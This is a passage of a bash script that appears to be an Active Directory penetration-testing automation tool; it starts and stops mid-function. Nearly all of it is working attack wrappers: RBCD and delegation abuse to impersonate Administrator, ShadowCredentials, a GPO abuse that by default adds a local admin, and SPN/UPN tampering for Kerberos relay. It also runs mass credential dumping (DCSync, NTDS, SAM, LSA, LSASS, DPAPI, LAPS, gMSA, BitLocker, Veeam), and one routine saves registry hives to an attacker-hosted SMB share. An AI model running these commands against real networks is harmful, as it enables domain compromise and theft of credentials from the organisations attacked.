\"${output_dir}/Modification/bloodyAD/bloodyad_out_rbcdspnless_${dc_domain}.txt\"; then\n                        echo -e \"${GREEN}[+] SPN-less RBCD Attack successful! Attempting to generate ticket to impersonate Administrator${NC}\"\n                        run_command \"KRB5CCNAME=${output_dir}/Modification/${user_spnless}.ccache ${impacket_getST} -u2u -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${user_spnless}' -k -no-pass\"\n                        if [ -f \"${output_dir}/Modification/Administrator@cifs_${target_rbcd}.${domain}@${domain}.ccache\" ]; then\n                            echo -e \"${GREEN}[+] Ticket impersonating Administrator generated successfully!${NC}\"\n                        else\n                            echo -e \"${RED}[-] Generation of ticket impersonating Administrator failed!${NC}\"\n                        fi\n                        echo -e \"${CYAN}[!] Run command below to reset password of ${user_spnless}:${NC}\"\n                        echo -e \"${impacket_changepasswd} ${domain}/${user_spnless}@${dc_ip} -hashes :${ticketsesskey} -newpass <NEW PASSWORD>\"\n                        echo -e \"${CYAN}[!] Run command below to remove impersonation rights:${NC}\"\n                        echo -e \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${user_spnless}'\"\n                    fi\n                else\n                    echo -e \"${RED}[-] Failed to generate TGT${NC}\"\n                fi\n                cd \"${current_dir}\" || exit\n            fi\n\n        fi\n    fi\n    echo -e \"\"\n}\n\nshadowcreds_attack() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: user01 or DC01$ ${NC}\"\n            target_shadowcreds=\"\"\n            read -rp \">> \" target_shadowcreds </dev/tty\n            while [ \"${target_shadowcreds}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_shadowcreds </dev/tty\n            done\n            echo -e \"${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add shadowCredentials '${target_shadowcreds}' --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\npygpo_abuse() {\n    if [ ! -f \"${pygpoabuse}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of pygpoabuse${NC}\"\n    elif [ \"${nullsess_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] pygpoabuse requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n    else\n        echo -e \"${BLUE}[*] Using modification rights on GPO to execute command. Please specify GPO ID${NC}\"\n        echo -e \"${CYAN}[*] Example: 31a09564-cd4a-4520-98fa-446a2af23b4b ${NC}\"\n        target_gpoabuse=\"\"\n        read -rp \">> \" target_gpoabuse </dev/tty\n        while [ \"${target_gpoabuse}\" == \"\" ]; do\n            echo -e \"${RED}Invalid ID.${NC} Please specify GPO ID:\"\n            read -rp \">> \" target_gpoabuse </dev/tty\n        done\n        target_userbool=\"\"\n        echo -e \"${BLUE}[*] Please type 'user' if you wish to set user GPO or 'computer' to set computer GPO${NC}\"\n        read -rp \">> \" target_userbool </dev/tty\n        while [ \"${target_userbool}\" != \"user\" ] && [ \"${target_userbool}\" != \"computer\" ]; do\n            echo -e \"${RED}Invalid input.${NC} Please choose between 'user' and 'computer':\"\n            read -rp \">> \" target_userbool </dev/tty\n        done\n        if [ \"${target_userbool}\" == \"user\" ]; then\n            echo -e \"${YELLOW}[!] User GPO chosen!${NC}\"\n            userbool_gpoabuse=\"-user\"\n        else\n            echo -e \"${YELLOW}[!] Computer GPO chosen!${NC}\"\n            userbool_gpoabuse=\"\"\n        fi\n        command_gpoabuse=\"\"\n        echo -e \"${BLUE}[*] Please specify command to execute. Press enter to use default: create user john with password 'H4x00r123..' as local administrator${NC}\"\n        read -rp \">> \" command_input_gpoabuse </dev/tty\n        if [ ! \"${command_input_gpoabuse}\" == \"\" ]; then command_gpoabuse=\"-command ${command_input_gpoabuse}\"; fi\n        if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-ldaps\"; else ldaps_param=\"\"; fi\n        run_command \"${python3} ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}\" 2>&1 | tee -a \"${output_dir}/Modification/pygpoabuse_output.txt\"\n    fi\n    echo -e \"\"\n}\n\nadd_unconstrained() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Adding Unconstrained Delegation rights on owned account. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: DC01 or FILE01 ${NC}\"\n            target_unconsdeleg=\"\"\n            read -rp \">> \" target_unconsdeleg </dev/tty\n            while [ \"${target_unconsdeleg}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_unconsdeleg </dev/tty\n            done\n            echo -e \"${CYAN}[*] Adding Unconstrained Delegation rights to ${target_unconsdeleg}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_unconsdeleg}$' -f TRUSTED_FOR_DELEGATION\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_unconsdeleg_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nadd_spn() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Adding CIFS and HTTP SPNs to owned computer account. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: DC01 or FILE01 ${NC}\"\n            target_spn=\"\"\n            read -rp \">> \" target_spn </dev/tty\n            while [ \"${target_spn}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_spn </dev/tty\n            done\n            echo -e \"${CYAN}[*] Adding CIFS and HTTP SPNs to ${target_spn}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' ServicePrincipalName -v 'HOST/${target_spn}' -v 'HOST/${target_spn}.${domain}' -v 'RestrictedKrbHost/${target_spn}' -v 'RestrictedKrbHost/${target_spn}.${domain}' -v 'CIFS/${target_spn}.${domain}' -v 'HTTP/${target_spn}.${domain}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AdditionalDnsHostName -v '${target_spn}.${domain}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt\"\n            if grep -q -a \"has been updated\" \"${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt\"; then\n                echo -e \"${GREEN}[+] Adding CIFS and HTTP SPNs successful! Run command below to perform Kerberos relay attack${NC}\"\n                echo -e \"${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${target_spn}.${domain} --dc-ip $dc_ip\"\n                echo -e \"${python3} krbrelayx-master/krbrelayx.py -hashes :< NTLM hash of computer account >\"\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nadd_upn() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Adding userPrincipalName to owned user account. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: user01 ${NC}\"\n            target_upn=\"\"\n            read -rp \">> \" target_upn </dev/tty\n            while [ \"${target_upn}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_upn </dev/tty\n            done\n            value_upn=\"\"\n            echo -e \"${BLUE}[*] Adding userPrincipalName to ${target_upn}. Please specify user to impersonate:${NC}\"\n            echo -e \"${CYAN}[*] Example: user02 ${NC}\"\n            read -rp \">> \" value_upn </dev/tty\n            while [ \"${value_upn}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify value of upn:\"\n                read -rp \">> \" value_upn </dev/tty\n            done\n            echo -e \"${CYAN}[*] Adding UPN ${value_upn} to ${target_upn}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_upn}' userPrincipalName -v '${value_upn}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt\"\n            if grep -q -a \"has been updated\" \"${output_dir}/Modification/bloodyAD/bloodyad_out_upn_${dc_domain}.txt\"; then\n                echo -e \"${GREEN}[+] Adding UPN successful! First modify getTGT.py as shown below${NC}\"\n                echo -e \"${YELLOW}old line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_PRINCIPAL${NC}.value)\"\n                echo -e \"${YELLOW}new line #58${NC}: userName = Principal(self.__user, type=constants.PrincipalNameType.${YELLOW}NT_ENTERPRISE${NC}.value)\"\n                echo -e \"${GREEN}[+] Generate Kerberos ticket of impersonated user:${NC}\"\n                echo -e \"${impacket_getTGT} ${domain}/${value_upn}:< password of ${target_upn} > -dc-ip ${dc_ip}\"\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nadd_constrained() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Adding Constrained Delegation rights on owned account. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: DC01 or FILE01 ${NC}\"\n            target_consdeleg=\"\"\n            read -rp \">> \" target_consdeleg </dev/tty\n            while [ \"${target_consdeleg}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_consdeleg </dev/tty\n            done\n            echo -e \"${CYAN}[*] Adding Constrained Delegation rights to ${target_consdeleg}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_consdeleg}$' -f TRUSTED_TO_AUTH_FOR_DELEGATION\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_consdeleg_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nadd_spn_constrained() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Adding SPNs of Domain Controller to owned computer account (msDS-AllowedToDelegateTo). Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: DC01 or FILE01 ${NC}\"\n            target_spn=\"\"\n            read -rp \">> \" target_spn </dev/tty\n            while [ \"${target_spn}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_spn </dev/tty\n            done\n            echo -e \"${CYAN}[*] Adding DC HOST and LDAP SPNs to ${target_spn}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AllowedToDelegateTo -v 'HOST/${dc_NETBIOS}' -v 'HOST/${dc_FQDN}' -v 'LDAP/${dc_NETBIOS}' -v 'LDAP/${dc_FQDN}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_spn_const_${dc_domain}.txt\"\n            if grep -q -a \"has been updated\" \"${output_dir}/Modification/bloodyAD/bloodyad_out_spn_const_${dc_domain}.txt\"; then\n                echo -e \"${GREEN}[+] Adding DC SPNs successful! Run command below to generate impersonated ticket ${NC}\"\n                echo -e \"${impacket_getST} -spn '< HOST/${dc_FQDN} OR LDAP/${dc_FQDN} >' -impersonate ${dc_NETBIOS} ${domain}/'${target_spn}$':'< password of ${target_spn} >'\"\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\n###### pwd_dump: Password Dump\njuicycreds_dump() {\n    echo -e \"${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    for i in $(/bin/cat \"${servers_smb_list}\"); do\n        echo -e \"${CYAN}[*] Searching in ${i} ${NC}\"\n        run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M firefox --log ${output_dir}/Credentials/firefox_${dc_domain}_${i}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M rdcman --log ${output_dir}/Credentials/rdcman_${dc_domain}_${i}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M teams_localdb --log ${output_dir}/Credentials/teams_localdb_${dc_domain}_${i}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M wifi --log ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M winscp --log ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt\" 2>&1\n    done\n    echo -e \"\"\n}\n\nlaps_dump() {\n    echo -e \"${BLUE}[*] LAPS Dump${NC}\"\n    run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} -M laps --kdcHost ${dc_FQDN} --log ${output_dir}/Credentials/laps_dump_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\ngmsa_dump() {\n    echo -e \"${BLUE}[*] gMSA Dump${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] gMSA Dump requires credentials${NC}\"\n    else\n        run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} --gmsa --log ${output_dir}/Credentials/gMSA_dump_${dc_domain}.txt\" 2>&1\n    fi\n    echo -e \"\"\n}\n\nsecrets_dump_dcsync() {\n    if [ ! -f \"${impacket_secretsdump}\" ]; then\n        echo -e \"${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}\"\n    else\n        echo -e \"${BLUE}[*] Performing DCSync using secretsdump${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] DCSync requires credentials${NC}\"\n        else\n            run_command \"${impacket_secretsdump} ${argument_imp}\\\\@${target} -just-dc\" | tee \"${output_dir}/Credentials/dcsync_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nsecrets_dump() {\n    if [ ! -f \"${impacket_secretsdump}\" ]; then\n        echo -e \"${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}\"\n    else\n        echo -e \"${BLUE}[*] Dumping credentials using secretsdump${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] secretsdump requires credentials${NC}\"\n        else\n            smb_scan\n            for i in $(/bin/cat \"${servers_smb_list}\"); do\n                echo -e \"${CYAN}[*] secretsdump of ${i} ${NC}\"\n                run_command \"${impacket_secretsdump} ${argument_imp}\\\\@${i} -dc-ip ${dc_ip}\" | tee \"${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt\"\n            done\n        fi\n    fi\n    echo -e \"\"\n}\n\nsamsystem_dump() {\n    if [ ! -f \"${impacket_reg}\" ]; then\n        echo -e \"${RED}[-] reg.py not found! Please verify the installation of impacket${NC}\"\n    else\n        echo -e \"${BLUE}[*] Extraction SAM SYSTEM and SECURITY using reg${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] reg requires credentials${NC}\"\n        else\n            smb_scan\n            set_attackerIP\n            echo -e \"${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}\"\n            echo -e \"${impacket_smbserver} -ip $attacker_IP -smb2support lwpshare ${output_dir}/Credentials/\"\n            read -rp \"\" </dev/tty\n            for i in $(/bin/cat \"${servers_smb_list}\"); do\n                echo -e \"${CYAN}[*] reg save of ${i} ${NC}\"\n                mkdir -p \"${output_dir}/Credentials/SAMDump/${i}\"\n                run_command \"${impacket_reg} ${argument_imp}\\\\@${i} -dc-ip ${dc_ip} backup -o \\\\\\\\$attacker_IP\\\\lwpshare\\\\SAMDump\\\\$i\" | tee \"${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt\"\n            done\n        fi\n    fi\n    echo -e \"\"\n}\n\nntds_dump() {\n    echo -e \"${BLUE}[*] Dumping NTDS using netexec${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] NTDS dump requires credentials${NC}\"\n    else\n        run_command \"${netexec} ${ne_verbose} smb ${target} ${argument_ne} --ntds --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt\" 2>&1\n        #${netexec} ${ne_verbose} smb ${target} \"${argument_ne}\" -M ntdsutil --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt\"\n    fi\n    echo -e \"\"\n}\n\nsam_dump() {\n    echo -e \"${BLUE}[*] Dumping SAM credentials${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] SAM dump requires credentials${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n            curr_targets=\"Domain Controllers\"\n        fi\n        smb_scan\n        for i in $(/bin/cat \"${servers_smb_list}\"); do\n            echo -e \"${CYAN}[*] SAM dump of ${i} ${NC}\"\n            run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt\" 2>&1\n        done\n    fi\n    echo -e \"\"\n}\n\nlsa_dump() {\n    echo -e \"${BLUE}[*] Dumping LSA credentials${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] LSA dump requires credentials${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n            curr_targets=\"Domain Controllers\"\n        fi\n        smb_scan\n        for i in $(/bin/cat \"${servers_smb_list}\"); do\n            echo -e \"${CYAN}[*] LSA dump of ${i} ${NC}\"\n            run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa --log ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt\" 2>&1\n        done\n    fi\n    echo -e \"\"\n}\n\nlsassy_dump() {\n    echo -e \"${BLUE}[*] Dumping LSASS using lsassy${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] LSASS dump requires credentials${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n            curr_targets=\"Domain Controllers\"\n        fi\n        smb_scan\n        for i in $(/bin/cat \"${servers_smb_list}\"); do\n            echo -e \"${CYAN}[*] LSASS dump of ${i} using lsassy${NC}\"\n            run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M lsassy --log ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt\" 2>&1\n        done\n    fi\n    echo -e \"\"\n}\n\nhandlekatz_dump() {\n    echo -e \"${BLUE}[*] Dumping LSASS using handlekatz${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] LSASS dump requires credentials${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n            curr_targets=\"Domain Controllers\"\n        fi\n        smb_scan\n        for i in $(/bin/cat \"${servers_smb_list}\"); do\n            echo -e \"${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}\"\n            run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M handlekatz --log ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt\" 2>&1\n        done\n    fi\n    echo -e \"\"\n}\n\nprocdump_dump() {\n    echo -e \"${BLUE}[*] Dumping LSASS using procdump${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] LSASS dump requires credentials${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n            curr_targets=\"Domain Controllers\"\n        fi\n        smb_scan\n        for i in $(/bin/cat \"${servers_smb_list}\"); do\n            echo -e \"${CYAN}[*] LSASS dump of ${i} using procdump ${NC}\"\n            run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M procdump --log ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt\" 2>&1\n        done\n    fi\n    echo -e \"\"\n}\n\nnanodump_dump() {\n    echo -e \"${BLUE}[*] Dumping LSASS using nanodump${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] LSASS dump requires credentials${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n            curr_targets=\"Domain Controllers\"\n        fi\n        smb_scan\n        for i in $(/bin/cat \"${servers_smb_list}\"); do\n            echo -e \"${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}\"\n            run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nanodump --log ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt\" 2>&1\n        done\n    fi\n    echo -e \"\"\n}\n\ndpapi_dump() {\n    echo -e \"${BLUE}[*] Dumping DPAPI secrets using netexec${NC}\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] DPAPI dump requires credentials${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n            curr_targets=\"Domain Controllers\"\n        fi\n        smb_scan\n        for i in $(/bin/cat \"${servers_smb_list}\"); do\n            echo -e \"${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}\"\n            run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi cookies --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt\" 2>&1\n            run_command \"${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi nosystem --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt\" 2>&1\n        done\n    fi\n    echo -e \"\"\n}\n\ndonpapi_dump() {\n    if [ ! -f \"${donpapi}\" ]; then\n        echo -e \"${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}\"\n    else\n        echo -e \"${BLUE}[*] Dumping secrets using DonPAPI${NC}\"\n        mkdir -p \"${output_dir}/Credentials/DonPAPI/recover\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] DonPAPI requires credentials${NC}\"\n        else\n            smb_scan\n            for i in $(/bin/cat \"${servers_smb_list}\"); do\n                echo -e \"${CYAN}[*] DonPAPI dump of ${i} ${NC}\"\n                run_command \"${donpapi} -o ${output_dir}/Credentials/DonPAPI collect ${argument_donpapi} -t ${i} --dc-ip ${dc_ip}\" | tee \"${output_dir}/Credentials/DonPAPI/DonPAPI_${dc_domain}_${i}.txt\"\n            done\n        fi\n    fi\n    echo -e \"\"\n}\n\nhekatomb_dump() {\n    if [ ! -f \"${hekatomb}\" ]; then\n        echo -e \"${RED}[-] hekatomb.py not found! Please verify the installation of HEKATOMB${NC}\"\n    else\n        echo -e \"${BLUE}[*] Dumping secrets using hekatomb${NC}\"\n        if [ \"${nullsess_bool}\" == true ] || [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] hekatomb requires credentials and does not support Kerberos authentication${NC}\"\n        else\n            current_dir=$(pwd)\n            cd \"${output_dir}/Credentials\" || exit\n            run_command \"${hekatomb} ${argument_hekatomb}\\\\@${dc_ip} -dns ${dc_ip} -smb2 -csv\" | tee \"${output_dir}/Credentials/hekatomb_${dc_domain}.txt\"\n            cd \"${current_dir}\" || exit\n        fi\n    fi\n    echo -e \"\"\n}\n\nbitlocker_dump() {\n    if [ ! -f \"${ExtractBitlockerKeys}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of ExtractBitlockerKeys${NC}\"\n    else\n        echo -e \"${BLUE}[*] Extracting BitLocker keys using ExtractBitlockerKeys${NC}\"\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] ExtractBitlockerKeys requires credentials ${NC}\"\n        else\n            if [ \"${verbose_bool}\" == true ]; then verbose_p0dalirius=\"-v\"; else verbose_p0dalirius=\"\"; fi\n            run_command \"${python3} ${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}\" 2>&1 | tee \"${output_dir}/Credentials/bitlockerdump_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nmsol_dump() {\n    echo -e \"${BLUE}[*] MSOL password dump. Please specify IP or hostname of Azure AD-Connect server:${NC}\"\n    echo -e \"${CYAN}[*] Example: 10.1.0.5 or ADConnect01 or ADConnect01.domain.com ${NC}\"\n    target_msol=\"\"\n    read -rp \">> \" target_msol </dev/tty\n    while [ \"${target_msol}\" == \"\" ]; do\n        echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n        read -rp \">> \" target_msol </dev/tty\n    done\n    run_command \"${netexec} ${ne_verbose} smb ${target_msol} ${argument_ne} -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt\" 2>&1\n    echo -e \"\"\n}\n\nveeam_dump() {\n    echo -e \"${BLUE}[*] Veeam credentials dump. Please specify IP or hostname of Veeam server:${NC}\"\n    echo -e \"${CYAN}[*] Example: 10.1.0.5 or VEEAM01 or VEEAM01.domain.com ${NC}\"\n    target_veeam=\"\"\n    read -rp \">> \" target_veeam </dev/tty\n    while [ \"${target_veeam}\" == \"\" ]; do\n        echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n        read -rp \">> \" target_veeam </dev/tty\n    done\n    run_command \"${netexec} ${ne_verbose} smb ${target_veeam} ${argument_ne} -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt\" 2>&1\n    echo -e \"\"\n}\n\nget_hash() {\n    if [ ! -f \"${impacket_secretsdump}\" ]; then\n        echo -e \"${RED}[-] secretsdump.py not found! Please verify the installation of 